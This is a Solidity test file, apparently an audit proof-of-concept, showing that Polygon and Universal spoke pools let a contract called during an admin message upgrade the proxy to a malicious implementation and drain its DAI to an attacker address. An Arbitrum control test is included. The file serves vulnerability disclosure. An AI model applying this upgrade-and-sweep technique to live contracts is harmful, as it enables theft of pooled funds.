// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { UniversalWorld } from "./util/UniversalWorld.sol";
import { HookToken, EvilImpl, HookReceiver } from "./util/Actors.sol";
import { Polygon_SpokePool } from "across/spoke-pools/Polygon_SpokePool.sol";
import { PolygonTokenBridger } from "across/spoke-pools/PolygonTokenBridger.sol";
import { Arbitrum_SpokePool } from "across/spoke-pools/Arbitrum_SpokePool.sol";
import { Universal_SpokePool } from "across/spoke-pools/Universal_SpokePool.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts-v4/proxy/ERC1967/ERC1967Proxy.sol";
import { IERC20 } from "@openzeppelin/contracts-v4/token/ERC20/IERC20.sol";
import { ITokenMessenger } from "across/external/interfaces/CCTPInterfaces.sol";
import { CrossDomainAddressUtils } from "across/libraries/CrossDomainAddressUtils.sol";

// Authority predicate auth(frame) for onlyAdmin.
//   Arbitrum/OP/ZkSync/Linea/Ethereum: a function of msg.sender of the CURRENT frame (principal-based).
//   Polygon (callValidated) / Universal (_adminCallValidated): a global flag set for the whole duration of the
//   admin message (temporal). _authorizeUpgrade (SpokePool.sol:325) is onlyAdmin and, unlike the other admin
//   functions, not nonReentrant; so any frame that gains control while an admin message runs
//   (e.g. via executeExternalCall, SpokePool.sol:413-427) inherits upgrade authority.
contract T08_AmbientAuthority is UniversalWorld {
    HookToken hook;
    EvilImpl evil;
    HookReceiver receiver;
    address hubAddr = makeAddr("hubPoolL1");
    address attacker = makeAddr("attacker");

    function setUp() public {
        _setUpUniversal();
        hook = new HookToken();
        evil = new EvilImpl();
        receiver = new HookReceiver(address(evil));
    }

    function _adminMsg(address spoke) internal view returns (bytes memory) {
        // The admin's intent: move 1 HOOK token held by the spoke to `receiver` (benign on its face).
        bytes memory inner = abi.encodeCall(HookToken.transferAndCall, (address(receiver), 1, ""));
        spoke; // target spoke does not change the payload
        return abi.encodeWithSignature("executeExternalCall(bytes)", abi.encode(address(hook), inner));
    }

    function test_polygon_calleeInheritsUpgradeAuthority() public {
        address fxChild = makeAddr("fxChild");
        Polygon_SpokePool impl = new Polygon_SpokePool(
            address(fixture.weth), 3600, 21600, IERC20(address(0)), ITokenMessenger(address(0)), 0, 0, address(0)
        );
        Polygon_SpokePool spoke = Polygon_SpokePool(
            payable(
                new ERC1967Proxy(
                    address(impl),
                    abi.encodeCall(Polygon_SpokePool.initialize, (0, PolygonTokenBridger(payable(makeAddr("bridger"))), hubAddr, hubAddr, fxChild))
                )
            )
        );
        hook.mint(address(spoke), 1);
        dai.mint(address(spoke), 500 ether);

        vm.prank(fxChild);
        spoke.processMessageFromRoot(0, hubAddr, _adminMsg(address(spoke)));
        assertTrue(receiver.upgradeSucceeded(), "callee upgraded the spoke");
        EvilImpl(address(spoke)).sweep(IERC20(address(dai)), attacker);
        assertEq(dai.balanceOf(attacker), 500 ether, "spoke drained after one admin message");
    }

    function test_universal_calleeInheritsUpgradeAuthority() public {
        Universal_SpokePool spoke = _newSpoke();
        fixture.hubPool.setCrossChainContracts(X, address(uAdapter), address(spoke));
        hook.mint(address(spoke), 1);
        dai.mint(address(spoke), 500 ether);
        bytes memory m = _adminMsg(address(spoke));
        fixture.hubPool.relaySpokePoolAdminFunction(X, m); // owner action on L1, nonce 0
        uint256 h = _prove(_n1(0));
        spoke.executeMessage(0, abi.encode(address(spoke), m), h);
        assertTrue(receiver.upgradeSucceeded(), "callee upgraded the spoke");
        EvilImpl(address(spoke)).sweep(IERC20(address(dai)), attacker);
        assertEq(dai.balanceOf(attacker), 500 ether);
    }

    function test_arbitrum_control_principalBased() public {
        Arbitrum_SpokePool impl = new Arbitrum_SpokePool(
            address(fixture.weth), 3600, 21600, IERC20(address(0)), ITokenMessenger(address(0)), 0, 0, address(0)
        );
        Arbitrum_SpokePool spoke = Arbitrum_SpokePool(
            payable(
                new ERC1967Proxy(
                    address(impl),
                    abi.encodeCall(Arbitrum_SpokePool.initialize, (0, makeAddr("router"), hubAddr, hubAddr))
                )
            )
        );
        hook.mint(address(spoke), 1);
        vm.prank(CrossDomainAddressUtils.applyL1ToL2Alias(hubAddr));
        (bool ok, ) = address(spoke).call(_adminMsg(address(spoke)));
        assertTrue(ok, "admin message itself succeeds");
        assertFalse(receiver.upgradeSucceeded(), "callee has no authority on a principal-based spoke");
    }
}
